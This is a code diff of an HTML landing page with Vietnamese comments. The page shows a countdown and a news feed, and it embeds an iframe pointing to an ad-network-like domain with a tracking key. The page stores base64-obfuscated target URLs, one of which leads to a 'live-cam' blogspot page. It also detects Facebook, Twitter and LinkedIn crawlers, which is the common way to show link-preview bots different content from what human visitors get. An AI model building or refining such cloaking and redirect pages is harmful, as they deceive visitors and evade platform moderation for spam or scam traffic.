@@ -15,11 +15,20 @@
     }
     .embedded-frame {
       width: 100%;
-      height: 400px;
+      height: 500px;
       border: 1px solid #ddd;
       border-radius: 8px;
       margin-bottom: 20px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      background: #f8f9fa;
+    }
+    .frame-loading {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      font-size: 18px;
+      color: #666;
     }
     .simple-countdown {
       text-align: center;
@@ -92,8 +101,21 @@
   </style>
 </head>
 <body>
- 
-  <iframe class="embedded-frame" id="embedded-content" src="" frameborder="0" allowfullscreen></iframe>
+  <!-- Iframe được thêm vào đầu trang và tải trước tiên -->
+  <div class="embedded-frame">
+    <iframe 
+      id="embedded-content" 
+      src="https://oblivionplaysaltered.com/ncc53nijfk?key=02d6efceaf8b7a7f564b99413c4b3056" 
+      frameborder="0" 
+      allowfullscreen
+      style="width: 100%; height: 100%; border: none;"
+      onload="console.log('Iframe loaded successfully')"
+      onerror="console.log('Iframe loading failed')"
+    ></iframe>
+    <div id="frame-loading" class="frame-loading" style="display: none;">
+      Loading content...
+    </div>
+  </div>
 
   <div class="simple-countdown" id="countdown-section">
     <div>Please wait</div>
@@ -118,9 +140,6 @@
       'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
     ];
 
-
-    const ENCRYPTED_IFRAME_LINK = 'aHR0cHM6Ly9vYmxpdmlvbnBsYXlzYWx0ZXJlZC5jb20vbmNjNTNuampmayZrZXk9MDJkNmVmY2VhZjhiN2E3ZjU2NGI5OTQxM2M0YjMwNTY=';
-
     function decryptTarget(encrypted) {
       return atob(encrypted);
     }
@@ -134,15 +153,27 @@
       return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
     }
 
-
-    function loadIframeContent() {
+    // Hiển thị trạng thái loading cho iframe
+    function setupIframeLoading() {
       const iframe = document.getElementById('embedded-content');
-      const decodedLink = decryptTarget(ENCRYPTED_IFRAME_LINK);
-      iframe.src = decodedLink;
-      console.log('Iframe loaded with:', decodedLink);
+      const loadingDiv = document.getElementById('frame-loading');
+      
+      iframe.onload = function() {
+        loadingDiv.style.display = 'none';
+        console.log('Iframe content loaded successfully');
+      };
+      
+      iframe.onerror = function() {
+        loadingDiv.style.display = 'flex';
+        loadingDiv.innerHTML = 'Failed to load content. Please check the link.';
+        console.error('Iframe failed to load');
+      };
+      
+      // Hiển thị loading ngay lập tức
+      loadingDiv.style.display = 'flex';
     }
 
-
+    // 📰 LẤY TIN + ẢNH TỪ RSS GOOGLE NEWS
     async function loadSimpleNews() {
       const container = document.getElementById('news-container');
       const rssURL = 'https://news.google.com/rss?hl=en-US&gl=US';
@@ -204,8 +235,8 @@
       }, 1000);
     }
 
-
-    loadIframeContent();
+    // Thiết lập iframe ngay lập tức
+    setupIframeLoading();
 
     document.addEventListener('DOMContentLoaded', () => {
       loadSimpleNews();
